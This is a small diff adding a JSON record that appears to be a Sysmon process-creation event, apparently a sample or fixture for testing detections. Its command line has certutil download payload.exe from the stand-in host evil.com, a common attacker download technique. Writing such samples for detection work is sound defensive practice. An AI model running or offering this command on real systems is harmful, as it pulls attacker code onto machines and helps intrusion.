@@ -1,0 +1,5 @@
+{
+  "EventID": 1,
+  "Image": "C:\\Windows\\System32\\certutil.exe",
+  "CommandLine": "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe"
+}
